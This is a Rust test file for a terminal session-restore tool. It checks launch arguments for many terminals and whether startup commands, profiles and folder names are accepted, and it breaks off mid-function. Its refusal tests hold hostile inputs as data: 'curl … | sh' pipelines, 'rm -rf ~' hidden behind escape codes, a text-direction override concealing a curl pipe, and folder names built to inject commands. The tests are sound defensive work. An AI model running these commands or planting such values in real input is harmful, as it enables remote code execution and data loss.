//! Launch-plan and adapter-level tests.

use std::path::{Path, PathBuf};

use reframe_platform::mock::MockPlatform;
use reframe_platform::{
    Capability, LaunchTarget, OsKind, PackageInfo, PackageKind, Platform, PlatformInfo, Rect,
    WindowId, WindowInfo, WindowState,
};

use super::escape::tests::{
    applescript_decode, cmd_k_received, posix_words, windows_split, wt_join, wt_split,
};
use super::escape::{
    CMD_STARTUP_VARIABLE, cmd_command_line, powershell_encoded_command, windows_quote_arg,
};
use super::plan::{
    ConsoleShells, MAX_RESTORED_SESSIONS, PlanEnv, PlannedSession, plan_steps, prepare_sessions,
    usable_command, usable_profile,
};
use super::sessions::tests::{abs, p};
use super::{TerminalAdapter, TerminalKind};
use crate::adapters::{
    AdapterRegistry, AppAdapter, AppIdentity, CaptureContext, CaptureInput, InstanceModel,
    LaunchContext, LaunchStep,
};
use crate::model::{AppState, ApplicationEntry, CapabilityLevel, TerminalSession};

const PWSH: &str = r"C:\Program Files\PowerShell\7\pwsh.exe";
const WIN_PS: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
const CMD: &str = r"C:\Windows\System32\cmd.exe";

fn env(os: OsKind, target: LaunchTarget) -> PlanEnv {
    PlanEnv {
        os,
        target,
        user_args: Vec::new(),
        posix_shell: "/bin/bash".into(),
        wt_powershell: PWSH.into(),
        console: ConsoleShells {
            cmd: CMD.into(),
            powershell: WIN_PS.into(),
            pwsh: PWSH.into(),
        },
        home: Some("/Users/u".into()),
    }
}

fn exe(path: &str) -> LaunchTarget {
    LaunchTarget::Executable { path: path.into() }
}

fn bundle(id: &str) -> LaunchTarget {
    LaunchTarget::Package {
        package: PackageInfo {
            kind: PackageKind::MacBundle,
            id: id.into(),
            path: None,
        },
    }
}

fn window(dir: &str) -> PlannedSession {
    PlannedSession {
        directory: Some(dir.into()),
        new_window: true,
        ..Default::default()
    }
}

fn tab(dir: &str) -> PlannedSession {
    PlannedSession {
        new_window: false,
        ..window(dir)
    }
}

fn with_command(session: PlannedSession, command: &str) -> PlannedSession {
    PlannedSession {
        command: Some(command.into()),
        ..session
    }
}

fn with_profile(session: PlannedSession, profile: &str) -> PlannedSession {
    PlannedSession {
        profile: Some(profile.into()),
        ..session
    }
}

fn args(step: &LaunchStep) -> Vec<&str> {
    step.request.args.iter().map(String::as_str).collect()
}

fn terminal_session(dir: Option<PathBuf>, title: Option<&str>) -> TerminalSession {
    TerminalSession {
        working_directory: dir,
        profile: None,
        startup_command: None,
        startup_command_approved: false,
        window_title: title.map(Into::into),
    }
}

// ---- Per-terminal plans ---------------------------------------------------------------------

#[test]
fn gnome_terminal_opens_each_window_with_its_tabs() {
    let sessions = [
        with_profile(window("/home/u/api"), "Dark"),
        tab("/home/u/web"),
        window("/home/u/docs"),
    ];
    let target = exe("/usr/bin/gnome-terminal");
    let steps = plan_steps(
        Some(TerminalKind::GnomeTerminal),
        &env(OsKind::Linux, target.clone()),
        &sessions,
    );
    assert_eq!(steps.len(), 2);
    assert_eq!(
        args(&steps[0]),
        [
            "--window",
            "--working-directory=/home/u/api",
            "--profile=Dark",
            "--tab",
            "--working-directory=/home/u/web"
        ]
    );
    assert_eq!(steps[0].request.target, target);
    assert_eq!(steps[0].expected_windows, 1);
    assert_eq!(steps[0].title_hint.as_deref(), Some("api"));
    assert_eq!(
        args(&steps[1]),
        ["--window", "--working-directory=/home/u/docs"]
    );
    assert_eq!(steps[1].title_hint.as_deref(), Some("docs"));
}

#[test]
fn gnome_terminal_runs_an_approved_command_in_its_own_window() {
    let sessions = [
        window("/a"),
        with_command(tab("/b"), "npm run dev"),
        tab("/c"),
    ];
    let steps = plan_steps(
        Some(TerminalKind::GnomeTerminal),
        &env(OsKind::Linux, exe("gnome-terminal")),
        &sessions,
    );
    assert_eq!(steps.len(), 2);
    assert_eq!(
        args(&steps[0]),
        [
            "--window",
            "--working-directory=/a",
            "--tab",
            "--working-directory=/c"
        ]
    );
    assert_eq!(
        args(&steps[1]),
        [
            "--window",
            "--working-directory=/b",
            "--",
            "/bin/bash",
            "-c",
            "trap 'exec /bin/bash' INT\nnpm run dev\n\nexec /bin/bash"
        ]
    );
}

#[test]
fn windows_terminal_escapes_semicolons_and_encodes_commands() {
    let command = "Write-Host \"a; b\" & dir";
    let sessions = [
        with_profile(window(r"C:\work\a;b"), "Dev;Box"),
        with_command(tab(r"C:\My Projects\x\"), command),
    ];
    let steps = plan_steps(
        Some(TerminalKind::WindowsTerminal),
        &env(OsKind::Windows, exe("wt.exe")),
        &sessions,
    );
    assert_eq!(steps.len(), 1);
    let encoded = powershell_encoded_command(command);
    assert_eq!(
        args(&steps[0]),
        [
            "-w",
            "new",
            "new-tab",
            "-d",
            r"C:\work\a\;b",
            "-p",
            r"Dev\;Box",
            ";",
            "new-tab",
            "-d",
            r"C:\My Projects\x\",
            PWSH,
            "-NoExit",
            "-EncodedCommand",
            encoded.as_str(),
        ]
    );
    assert_eq!(steps[0].title_hint.as_deref(), Some("a;b"));

    // What wt.exe receives (Windows argument convention), then how it splits sub-commands.
    let line = steps[0]
        .request
        .args
        .iter()
        .map(|a| windows_quote_arg(a))
        .collect::<Vec<_>>()
        .join(" ");
    let received = windows_split(&line);
    assert_eq!(received, steps[0].request.args);
    assert_eq!(
        wt_split(&received),
        vec![
            vec![
                "-w",
                "new",
                "new-tab",
                "-d",
                r"C:\work\a;b",
                "-p",
                "Dev;Box"
            ],
            vec![
                "new-tab",
                "-d",
                r"C:\My Projects\x\",
                PWSH,
                "-NoExit",
                "-EncodedCommand",
                encoded.as_str()
            ],
        ]
    );
}

/// What the program started in a Windows Terminal tab receives: the step's arguments go through
/// the Windows argument convention to wt.exe, wt splits them into sub-commands, and re-joins the
/// trailing arguments of each `new-tab` into the tab's command line.
fn windows_terminal_tab_command_lines(step: &LaunchStep) -> Vec<String> {
    let line = step
        .request
        .args
        .iter()
        .map(|a| windows_quote_arg(a))
        .collect::<Vec<_>>()
        .join(" ");
    let received = windows_split(&line);
    assert_eq!(received, step.request.args);
    wt_split(&received)
        .iter()
        .map(|command| {
            // Skip `new-tab` and its options (each followed by a value) up to the program.
            let start = command
                .iter()
                .position(|a| a == "new-tab")
                .expect("every sub-command is a new-tab");
            let mut i = start + 1;
            while command
                .get(i)
                .is_some_and(|a| matches!(a.as_str(), "-d" | "-p"))
            {
                i += 2;
            }
            wt_join(&command[i..])
        })
        .collect()
}

#[test]
fn windows_terminal_runs_commands_in_the_profiles_shell() {
    let command = r#"cd "C:\My Projects\app" & echo a;b & npm start"#;
    let sessions = [
        with_command(with_profile(window(r"C:\a"), "Command Prompt"), command),
        with_command(with_profile(tab(r"C:\b"), "Windows PowerShell"), "Get-Date"),
        with_command(with_profile(tab(r"C:\c"), "Ubuntu"), "Get-Date"),
        with_profile(tab(r"C:\d"), "Command Prompt"),
    ];
    let steps = plan_steps(
        Some(TerminalKind::WindowsTerminal),
        &env(OsKind::Windows, exe("wt.exe")),
        &sessions,
    );
    assert_eq!(steps.len(), 1);
    let encoded = powershell_encoded_command("Get-Date");
    let tabs = windows_terminal_tab_command_lines(&steps[0]);
    assert_eq!(
        tabs,
        [
            format!("{CMD} /K \"{command}\""),
            format!("{WIN_PS} -NoExit -EncodedCommand {encoded}"),
            // Other profiles: PowerShell 7 (its path contains spaces, so wt quotes it).
            format!("\"{PWSH}\" -NoExit -EncodedCommand {encoded}"),
            String::new(),
        ]
    );
    // `cmd.exe /K` strips exactly the quotes wt added: the command arrives verbatim.
    let remainder = tabs[0].strip_prefix(&format!("{CMD} /K ")).unwrap();
    assert_eq!(cmd_k_received(remainder), cmd_command_line(command));
    assert_eq!(cmd_command_line(command), command);
}

#[test]
fn windows_console_starts_each_sessions_shell() {
    let sessions = [
        with_command(with_profile(window(r"C:\a"), "Command Prompt"), "npm start"),
        with_command(
            with_profile(window(r"C:\b"), "Windows PowerShell"),
            "Get-ChildItem \"x y\"",
        ),
        with_profile(window(r"C:\c"), "PowerShell"),
        with_command(
            with_profile(window(r"C:\d"), "Command Prompt"),
            r#"cd "C:\My Projects" & dir"#,
        ),
        PlannedSession {
            new_window: true,
            ..Default::default()
        },
    ];
    let steps = plan_steps(
        Some(TerminalKind::WindowsConsole),
        &env(OsKind::Windows, exe(CMD)),
        &sessions,
    );
    assert_eq!(steps.len(), 5);
    assert_eq!(steps[0].request.target, exe(CMD));
    assert_eq!(args(&steps[0]), ["/K", "npm start"]);
    assert_eq!(
        steps[0].request.working_directory.as_deref(),
        Some(Path::new(r"C:\a"))
    );
    assert_eq!(steps[1].request.target, exe(WIN_PS));
    let encoded = powershell_encoded_command("Get-ChildItem \"x y\"");
    assert_eq!(
        args(&steps[1]),
        ["-NoExit", "-EncodedCommand", encoded.as_str()]
    );
    assert_eq!(steps[2].request.target, exe(PWSH));
    assert!(steps[2].request.args.is_empty());
    // Quotes cannot reach cmd.exe verbatim on its command line: delivered through a variable.
    assert_eq!(args(&steps[3]), ["/K", "%REFRAME_STARTUP_COMMAND%"]);
    assert_eq!(
        steps[3].request.env,
        vec![(
            CMD_STARTUP_VARIABLE.to_string(),
            r#"cd "C:\My Projects" & dir"#.to_string()
        )]
    );
    assert_eq!(steps[4].request.target, exe(CMD));
    assert_eq!(steps[4].request.working_directory, None);
    assert!(steps.iter().all(|s| s.expected_windows == 1));
}

#[test]
fn konsole_terminator_ptyxis_add_tabs_with_follow_up_launches() {
    let sessions = [with_profile(window("/a"), "Work"), tab("/b"), window("/c")];
    let plan = |kind| plan_steps(Some(kind), &env(OsKind::Linux, exe("term")), &sessions);

    let steps = plan(TerminalKind::Konsole);
    assert_eq!(args(&steps[0]), ["--profile", "Work", "--workdir", "/a"]);
    assert_eq!(args(&steps[1]), ["--new-tab", "--workdir", "/b"]);
    assert_eq!(args(&steps[2]), ["--workdir", "/c"]);
    assert_eq!(
        steps.iter().map(|s| s.expected_windows).collect::<Vec<_>>(),
        [1, 0, 1]
    );

    let steps = plan(TerminalKind::Terminator);
    assert_eq!(
        args(&steps[0]),
        ["--working-directory=/a", "--profile=Work"]
    );
    assert_eq!(args(&steps[1]), ["--new-tab", "--working-directory=/b"]);

    // Tilix's tab action fails unless Tilix is already running: one window per session instead.
    let steps = plan(TerminalKind::Tilix);
    assert_eq!(steps.len(), 3);
    assert_eq!(
        args(&steps[0]),
        ["--working-directory=/a", "--profile=Work"]
    );
    assert_eq!(args(&steps[1]), ["--working-directory=/b"]);
    assert!(steps.iter().all(|s| s.expected_windows == 1));
    assert!(
        steps
            .iter()
            .all(|s| !s.request.args.iter().any(|a| a.starts_with("--action")))
    );

    let steps = plan(TerminalKind::Ptyxis);
    assert_eq!(args(&steps[0]), ["--new-window", "--working-directory=/a"]);
    assert_eq!(args(&steps[1]), ["--tab", "--working-directory=/b"]);
    assert_eq!(steps[1].expected_windows, 0);
}

#[test]
fn xfce_and_mate_pass_profiles_and_commands_per_tab() {
    let sessions = [window("/a"), with_command(tab("/b"), "make watch")];
    let steps = plan_steps(
        Some(TerminalKind::Xfce4Terminal),
        &env(OsKind::Linux, exe("xfce4-terminal")),
        &sessions,
    );
    assert_eq!(steps.len(), 1);
    let a = args(&steps[0]);
    assert_eq!(
        &a[..4],
        [
            "--window",
            "--working-directory=/a",
            "--tab",
            "--working-directory=/b"
        ]
    );
    let command_line = a[4].strip_prefix("--command=").unwrap();
    assert_eq!(
        posix_words(command_line).unwrap(),
        [
            "/bin/bash",
            "-c",
            "trap 'exec /bin/bash' INT\nmake watch\n\nexec /bin/bash"
        ]
    );

    let sessions = [
        with_profile(window("/a"), "Work"),
        with_profile(tab("/b"), "Logs"),
        tab("/c"),
    ];
    let steps = plan_steps(
        Some(TerminalKind::MateTerminal),
        &env(OsKind::Linux, exe("mate-terminal")),
        &sessions,
    );
    assert_eq!(
        args(&steps[0]),
        [
            "--window-with-profile=Work",
            "--working-directory=/a",
            "--tab-with-profile=Logs",
            "--working-directory=/b",
            "--tab",
            "--working-directory=/c"
        ]
    );
}

#[test]
fn single_window_terminals_open_one_window_per_session() {
    use TerminalKind as K;
    let sessions = [window("/a"), tab("/b")];
    let cases: &[(K, &[&str])] = &[
        (K::Alacritty, &["--working-directory", "/a"]),
        (K::Kitty, &["--directory", "/a"]),
        (K::WezTerm, &["start", "--cwd", "/a"]),
        (K::Foot, &["--working-directory=/a"]),
        (K::Ghostty, &["--working-directory=/a"]),
        (K::GnomeConsole, &["--working-directory=/a"]),
        (K::LxTerminal, &["--working-directory=/a"]),
        (K::Tilix, &["--working-directory=/a"]),
        (K::QTerminal, &["--workdir", "/a"]),
        (K::DeepinTerminal, &["--work-directory", "/a"]),
        (K::Terminology, &["--current-directory=/a"]),
    ];
    for (kind, expected) in cases {
        let steps = plan_steps(Some(*kind), &env(OsKind::Linux, exe("t")), &sessions);
        assert_eq!(steps.len(), 2, "{kind:?}");
        assert_eq!(args(&steps[0]), *expected, "{kind:?}");
        assert_eq!(steps[0].request.working_directory, None, "{kind:?}");
        assert_eq!(steps[1].title_hint.as_deref(), Some("b"), "{kind:?}");
    }
    for kind in [K::Xterm, K::Urxvt] {
        let steps = plan_steps(Some(kind), &env(OsKind::Linux, exe("t")), &sessions);
        assert!(steps[0].request.args.is_empty());
        assert_eq!(
            steps[0].request.working_directory.as_deref(),
            Some(Path::new("/a"))
        );
    }
}

#[test]
fn single_window_terminals_run_approved_commands() {
    use TerminalKind as K;
    let sessions = [with_command(window("/a"), "ls")];
    let shell: &[&str] = &[
        "/bin/bash",
        "-c",
        "trap 'exec /bin/bash' INT\nls\n\nexec /bin/bash",
    ];
    let with_shell = |prefix: &[&str]| -> Vec<String> {
        prefix.iter().chain(shell).map(|s| s.to_string()).collect()
    };
    let cases: Vec<(K, Vec<String>)> = vec![
        (
            K::Alacritty,
            with_shell(&["--working-directory", "/a", "-e"]),
        ),
        (K::Kitty, with_shell(&["--directory", "/a"])),
        (K::WezTerm, with_shell(&["start", "--cwd", "/a", "--"])),
        (K::Foot, with_shell(&["--working-directory=/a"])),
        (K::Ghostty, with_shell(&["--working-directory=/a", "-e"])),
        (
            K::GnomeConsole,
            with_shell(&["--working-directory=/a", "--"]),
        ),
        (K::Xterm, with_shell(&["-e"])),
        (K::Urxvt, with_shell(&["-e"])),
        (K::Konsole, with_shell(&["--workdir", "/a", "-e"])),
        (K::Terminator, with_shell(&["--working-directory=/a", "-x"])),
        (
            K::Ptyxis,
            with_shell(&["--new-window", "--working-directory=/a", "--"]),
        ),
    ];
    for (kind, expected) in cases {
        let steps = plan_steps(Some(kind), &env(OsKind::Linux, exe("t")), &sessions);
        assert_eq!(steps[0].request.args, expected, "{kind:?}");
    }
    // String-style command options (split with g_shell_parse_argv) are POSIX-quoted.
    for (kind, option) in [(K::LxTerminal, "--command="), (K::Tilix, "--command=")] {
        let steps = plan_steps(Some(kind), &env(OsKind::Linux, exe("t")), &sessions);
        let line = steps[0]
            .request
            .args
            .iter()
            .find_map(|a| a.strip_prefix(option))
            .unwrap_or_else(|| panic!("{kind:?}: no {option}"));
        assert_eq!(posix_words(line).unwrap(), shell, "{kind:?}");
    }
    // Terminology joins everything after `-e` and runs it with `$SHELL -c`: one quoted
    // argument, last, with SHELL pinned to the shell the quoting was made for.
    let steps = plan_steps(
        Some(K::Terminology),
        &env(OsKind::Linux, exe("t")),
        &sessions,
    );
    let a = args(&steps[0]);
    assert_eq!(a[..2], ["--current-directory=/a", "-e"]);
    assert_eq!(a.len(), 3);
    assert_eq!(posix_words(a[2]).unwrap(), shell);
    assert_eq!(
        steps[0].request.env,
        vec![("SHELL".to_string(), "/bin/bash".to_string())]
    );
    // QTerminal and Deepin Terminal have no reliable command option: folder only.
    for kind in [K::QTerminal, K::DeepinTerminal] {
        let steps = plan_steps(Some(kind), &env(OsKind::Linux, exe("t")), &sessions);
        assert_eq!(steps[0].request.args.len(), 2, "{kind:?}");
    }
}

#[test]
fn cross_platform_terminals_use_powershell_for_commands_on_windows() {
    let sessions = [with_command(window(r"C:\code"), "npm start")];
    let e = env(
        OsKind::Windows,
        exe(r"C:\Program Files\Alacritty\alacritty.exe"),
    );
    let encoded = powershell_encoded_command("npm start");
    let steps = plan_steps(Some(TerminalKind::Alacritty), &e, &sessions);
    assert_eq!(
        args(&steps[0]),
        [
            "--working-directory",
            r"C:\code",
            "-e",
            PWSH,
            "-NoExit",
            "-EncodedCommand",
            encoded.as_str()
        ]
    );
    let steps = plan_steps(Some(TerminalKind::WezTerm), &e, &sessions);
    assert_eq!(
        args(&steps[0]),
        [
            "start",
            "--cwd",
            r"C:\code",
            "--",
            PWSH,
            "-NoExit",
            "-EncodedCommand",
            encoded.as_str()
        ]
    );
}

#[test]
fn terminology_runs_commands_only_for_shells_the_quoting_is_proven_for() {
    let sessions = [with_command(window("/a"), "echo 'it''s' \\ done")];
    for (shell, runs) in [
        ("/bin/bash", true),
        ("/usr/bin/zsh", true),
        ("/usr/bin/fish", true),
        ("/usr/bin/nu", false),
        ("/usr/bin/elvish", false),
        ("/usr/bin/xonsh", false),
        ("/bin/tcsh", false),
        ("/usr/bin/pwsh", false),
    ] {
        let mut e = env(OsKind::Linux, exe("terminology"));
        e.posix_shell = shell.into();
        let steps = plan_steps(Some(TerminalKind::Terminology), &e, &sessions);
        let dump = format!("{steps:?}");
        assert_eq!(dump.contains("done"), runs, "{shell}: {dump}");
        assert_eq!(args(&steps[0])[0], "--current-directory=/a", "{shell}");
        if !runs {
            assert!(steps[0].request.env.is_empty(), "{shell}");
        }
    }
}

#[test]
fn macos_terminals_open_the_folder_or_use_applescript() {
    let terminal = bundle("com.apple.Terminal");
    let e = env(OsKind::Macos, terminal.clone());
    let steps = plan_steps(
        Some(TerminalKind::MacTerminal),
        &e,
        &[
            window("/Users/u/site"),
            PlannedSession {
                new_window: true,
                ..Default::default()
            },
        ],
    );
    assert_eq!(steps[0].request.target, terminal);
    assert_eq!(args(&steps[0]), ["/Users/u/site"]);
    // No folder: open the home folder (opening the bare app would only activate it).
    assert_eq!(args(&steps[1]), ["/Users/u"]);

    let command = "echo \"it's $HOME\" `id` \\ ; ls\nnpm start";
    let session = with_command(window("/Users/u/my dir"), command);
    let steps = plan_steps(
        Some(TerminalKind::MacTerminal),
        &e,
        std::slice::from_ref(&session),
    );
    assert_eq!(steps[0].request.target, exe("/usr/bin/osascript"));
    let lines: Vec<&str> = steps[0]
        .request
        .args
        .chunks(2)
        .map(|pair| {
            assert_eq!(pair[0], "-e");
            pair[1].as_str()
        })
        .collect();
    assert_eq!(lines[0], "tell application id \"com.apple.Terminal\"");
    assert_eq!(*lines.last().unwrap(), "end tell");
    let literal = lines
        .iter()
        .find_map(|l| l.strip_prefix("set newTab to do script "))
        .unwrap();
    let typed = applescript_decode(literal).unwrap();
    assert_eq!(typed, format!("cd '/Users/u/my dir' && {command}"));

    let steps = plan_steps(
        Some(TerminalKind::ITerm2),
        &env(OsKind::Macos, bundle("com.googlecode.iterm2")),
        &[with_profile(session.clone(), "Hotkey \"Window\"")],
    );
    let script = steps[0].request.args.join("\n");
    assert!(script.contains("tell application id \"com.googlecode.iterm2\""));
    assert!(script.contains("create window with profile \"Hotkey \\\"Window\\\"\""));
    let literal = steps[0]
        .request
        .args
        .iter()
        .find_map(|l| l.strip_prefix("tell current session of newWindow to write text "))
        .unwrap();
    assert_eq!(
        applescript_decode(literal).unwrap(),
        format!("cd '/Users/u/my dir' && {command}")
    );

    // Warp cannot be scripted: the folder opens, the command does not run.
    let steps = plan_steps(
        Some(TerminalKind::Warp),
        &env(OsKind::Macos, bundle("dev.warp.Warp-Stable")),
        &[session],
    );
    assert_eq!(args(&steps[0]), ["/Users/u/my dir"]);
}

#[test]
fn macos_terminals_never_type_a_folder_some_shell_would_misread() {
    // Each of these folder names reads differently in at least one login shell (fish: `\'`;
    // tcsh: `!`; PowerShell: typographic quotes end a single-quoted string; any shell: `'` and
    // line breaks). Typing `cd '<folder>' && <command>` could run part of the folder name, so
    // the folder is opened without AppleScript and the command is not run.
    for folder in [
        "/Users/u/\\';echo INJECTED;\\'",
        "/Users/u/Bob's files",
        "/Users/u/x\u{2019}; echo INJECTED; \u{2019}",
        "/Users/u/wow!",
        "/Users/u/back\\slash",
        "/Users/u/line\nbreak",
    ] {
        for (kind, id) in [
            (TerminalKind::MacTerminal, "com.apple.Terminal"),
            (TerminalKind::ITerm2, "com.googlecode.iterm2"),
        ] {
            let session = with_profile(with_command(window(folder), "make dev"), "Pro");
            let steps = plan_steps(Some(kind), &env(OsKind::Macos, bundle(id)), &[session]);
            assert_eq!(steps.len(), 1);
            assert_eq!(steps[0].request.target, bundle(id), "{folder:?}");
            assert_eq!(args(&steps[0]), [folder], "{folder:?}");
            let dump = format!("{steps:?}");
            assert!(
                !dump.contains("make dev") && !dump.contains("osascript"),
                "{dump}"
            );
        }
    }
    // Without a folder the command runs where the new window opens (the home folder).
    let steps = plan_steps(
        Some(TerminalKind::MacTerminal),
        &env(OsKind::Macos, bundle("com.apple.Terminal")),
        &[with_command(
            PlannedSession {
                new_window: true,
                ..Default::default()
            },
            "make dev",
        )],
    );
    let typed = steps[0]
        .request
        .args
        .iter()
        .find_map(|l| l.strip_prefix("set newTab to do script "))
        .and_then(applescript_decode);
    assert_eq!(typed.as_deref(), Some("make dev"));
}

#[test]
fn ghostty_on_macos_goes_through_launch_services() {
    let e = env(OsKind::Macos, exe("/usr/bin/open"));
    let steps = plan_steps(
        Some(TerminalKind::Ghostty),
        &e,
        &[
            with_command(window("/Users/u/x"), "ls"),
            PlannedSession {
                new_window: true,
                ..Default::default()
            },
        ],
    );
    assert_eq!(steps[0].request.target, exe("/usr/bin/open"));
    assert_eq!(
        args(&steps[0]),
        [
            "-n",
            "-b",
            "com.mitchellh.ghostty",
            "--args",
            "--working-directory=/Users/u/x",
            "-e",
            "/bin/bash",
            "-l",
            "-c",
            "trap 'exec /bin/bash -l' INT\nls\n\nexec /bin/bash -l"
        ]
    );
    assert_eq!(args(&steps[1]), ["-n", "-b", "com.mitchellh.ghostty"]);
}

#[test]
fn unknown_terminals_get_the_folder_as_working_directory() {
    let mut e = env(OsKind::Linux, exe("/opt/term/bin/term"));
    e.user_args = vec!["--fullscreen".into()];
    let steps = plan_steps(None, &e, &[with_command(window("/a"), "ls"), tab("/b")]);
    assert_eq!(steps.len(), 2);
    assert_eq!(args(&steps[0]), ["--fullscreen"]);
    assert_eq!(
        steps[0].request.working_directory.as_deref(),
        Some(Path::new("/a"))
    );
}

#[test]
fn user_arguments_come_first() {
    let mut e = env(OsKind::Linux, exe("gnome-terminal"));
    e.user_args = vec!["--hide-menubar".into()];
    let steps = plan_steps(Some(TerminalKind::GnomeTerminal), &e, &[window("/a")]);
    assert_eq!(
        args(&steps[0]),
        ["--hide-menubar", "--window", "--working-directory=/a"]
    );
    // Package launches on macOS take documents, never user flags.
    let mut e = env(OsKind::Macos, bundle("com.apple.Terminal"));
    e.user_args = vec!["--flag".into()];
    let steps = plan_steps(Some(TerminalKind::MacTerminal), &e, &[window("/a")]);
    assert_eq!(args(&steps[0]), ["/a"]);
}

#[test]
fn first_session_always_opens_a_window() {
    let steps = plan_steps(
        Some(TerminalKind::GnomeTerminal),
        &env(OsKind::Linux, exe("gnome-terminal")),
        &[tab("/a"), tab("/b")],
    );
    assert_eq!(steps.len(), 1);
    assert_eq!(
        args(&steps[0]),
        [
            "--window",
            "--working-directory=/a",
            "--tab",
            "--working-directory=/b"
        ]
    );
}

// ---- Preparing sessions (approval, folders) -------------------------------------------------

#[test]
fn missing_folders_keep_the_window_but_not_the_command() {
    let temp = tempfile::tempdir().unwrap();
    let existing = temp.path().to_path_buf();
    let state = AppState::Terminal {
        sessions: vec![
            TerminalSession {
                startup_command: Some("  npm start \n".into()),
                startup_command_approved: true,
                ..terminal_session(Some(existing.clone()), Some("a"))
            },
            TerminalSession {
                startup_command: Some("rm -rf build".into()),
                startup_command_approved: true,
                ..terminal_session(Some(existing.join("gone")), Some("b"))
            },
            TerminalSession {
                startup_command: Some("echo hi".into()),
                startup_command_approved: true,
                profile: Some("  ".into()),
                ..terminal_session(None, None)
            },
            TerminalSession {
                startup_command: Some("   ".into()),
                startup_command_approved: true,
                ..terminal_session(None, None)
            },
            TerminalSession {
                startup_command: Some("echo \0 nul".into()),
                startup_command_approved: true,
                ..terminal_session(Some("relative/dir".into()), None)
            },
        ],
    };
    let planned = prepare_sessions(&state, None, Path::is_dir);
    assert_eq!(
        planned,
        vec![
            PlannedSession {
                directory: Some(existing),
                profile: None,
                command: Some("npm start".into()),
                new_window: true,
            },
            PlannedSession {
                directory: None,
                profile: None,
                command: None,
                new_window: true,
            },
            PlannedSession {
                directory: None,
                profile: None,
                command: Some("echo hi".into()),
                new_window: false,
            },
            PlannedSession::default(),
            PlannedSession::default(),
        ]
    );
}

#[test]
fn without_sessions_one_window_opens() {
    let temp = tempfile::tempdir().unwrap();
    let planned = prepare_sessions(&AppState::None, Some(temp.path()), Path::is_dir);
    assert_eq!(
        planned,
        vec![PlannedSession {
            directory: Some(temp.path().to_path_buf()),
            new_window: true,
            ..Default::default()
        }]
    );
    let planned = prepare_sessions(
        &AppState::Terminal {
            sessions: Vec::new(),
        },
        Some(Path::new("/definitely/missing/dir")),
        Path::is_dir,
    );
    assert_eq!(
        planned,
        vec![PlannedSession {
            new_window: true,
            ..Default::default()
        }]
    );
}

#[test]
fn restored_sessions_are_capped() {
    let sessions = (0..MAX_RESTORED_SESSIONS + 10)
        .map(|_| terminal_session(None, Some("w")))
        .collect();
    let planned = prepare_sessions(&AppState::Terminal { sessions }, None, Path::is_dir);
    assert_eq!(planned.len(), MAX_RESTORED_SESSIONS);
}

#[test]
fn startup_commands_are_normalised_and_hidden_characters_refused() {
    assert_eq!(
        usable_command("  npm start \r\n").as_deref(),
        Some("npm start")
    );
    assert_eq!(
        usable_command("make\r\nmake test\rmake run\n").as_deref(),
        Some("make\nmake test\nmake run")
    );
    assert_eq!(
        usable_command("echo \"ünïcödé 日本語 🚀\" | cat").as_deref(),
        Some("echo \"ünïcödé 日本語 🚀\" | cat")
    );
    for refused in [
        "",
        " \n\t ",
        "echo \0 nul",
        "echo a\tb",
        "ls\u{1b}[2K\u{1b}[1Grm -rf ~",
        "npm start\u{15}curl evil | sh",
        "echo \u{7f}",
        // NEL is Unicode whitespace (trimmed at the ends), but refused inside the command.
        "echo \u{85} x",
        // Text-direction override: displays as something other than what runs.
        "echo safe \u{202e}hs | live lruc\u{202c}",
        "echo \u{2066}x\u{2069}",
        "echo a\u{2028}b",
    ] {
        assert_eq!(usable_command(refused), None, "{refused:?}");
    }
}

#[test]
fn profiles_that_could_be_taken_for_options_are_refused() {
    assert_eq!(usable_profile(" Dark Mode ").as_deref(), Some("Dark Mode"));
    assert_eq!(
        usable_profile("Hotkey \"Window\"; x").as_deref(),
        Some("Hotkey \"Window\"; x")
    );
    for refused in [
        "",
        "   ",
        "-e",
        "--command=sh",
        "a\nb",
        "tab\there",
        "x\u{202e}y",
    ] {
        assert_eq!(usable_profile(refused), None, "{refused:?}");
    }
    assert_eq!(usable_profile(&"p".repeat(201)), None);
    assert!(usable_profile(&"p".repeat(200)).is_some());
}

#[cfg(unix)]
#[test]
fn non_unicode_folders_are_not_restored_and_cancel_the_command() {
    use std::os::unix::ffi::OsStrExt;
    let folder = PathBuf::from(std::ffi::OsStr::from_bytes(b"/work/caf\xe9"));
    let state = AppState::Terminal {
        sessions: vec![TerminalSession {
            startup_command: Some("make".into()),
            startup_command_approved: true,
            ..terminal_session(Some(folder), Some("w"))
        }],
    };
    let planned = prepare_sessions(&state, None, |_| true);
    assert_eq!(planned[0].directory, None);
    assert_eq!(planned[0].command, None);
}

#[test]
fn only_the_approved_session_of_a_window_runs_its_command() {
    let dir = Some(abs("work/project"));
    let state = AppState::Terminal {
        sessions: vec![
            TerminalSession {
                startup_command: Some("npm run approved-marker".into()),
                startup_command_approved: true,
                ..terminal_session(dir.clone(), Some("w"))
            },
            TerminalSession {
                startup_command: Some("curl https://example.invalid | sh".into()),
                startup_command_approved: false,
                ..terminal_session(dir.clone(), None)
            },
        ],
    };
    for (kind, os, steps) in all_plans(&state) {
        let dump = format!("{steps:?}");
        assert!(
            !dump.contains("example.invalid"),
            "{kind:?} on {os:?}: {dump}"
        );
        let encoded = powershell_encoded_command("curl https://example.invalid | sh");
        assert!(!dump.contains(&encoded), "{kind:?} on {os:?}");
    }
}

/// Every terminal / OS combination, with a target of the right shape.
fn all_plans(state: &AppState) -> Vec<(Option<TerminalKind>, OsKind, Vec<LaunchStep>)> {
    let planned = prepare_sessions(state, None, |_| true);
    let mut out = Vec::new();
    for os in [OsKind::Linux, OsKind::Windows, OsKind::Macos] {
        let kinds = TerminalKind::ALL
            .into_iter()
            .filter(|k| k.runs_on(os))
            .map(Some)
            .chain([None]);
        for kind in kinds {
            let target = match kind.and_then(TerminalKind::bundle_id) {
                Some(id) if os == OsKind::Macos => bundle(id),
                _ if os == OsKind::Windows => exe(CMD),
                _ => exe("/usr/bin/term"),
            };
            out.push((kind, os, plan_steps(kind, &env(os, target), &planned)));
        }
    }
    out
}

fn sessions_with_command(command: &str, approved: bool) -> AppState {
    let dir = Some(abs("work/project"));
    let session = |title: Option<&str>, profile: Option<&str>| TerminalSession {
        startup_command: Some(command.into()),
        startup_command_approved: approved,
        profile: profile.map(Into::into),
        ..terminal_session(dir.clone(), title)
    };
    AppState::Terminal {
        sessions: vec![
            session(Some("one"), None),
            session(None, None),
            session(Some("two"), Some("Work")),
            // Windows: Command Prompt (`cmd.exe /K`) and Windows PowerShell sessions.
            session(None, Some("Command Prompt")),
            session(Some("three"), Some("Windows PowerShell")),
        ],
    }
}

#[test]
fn unapproved_commands_never_reach_any_launch() {
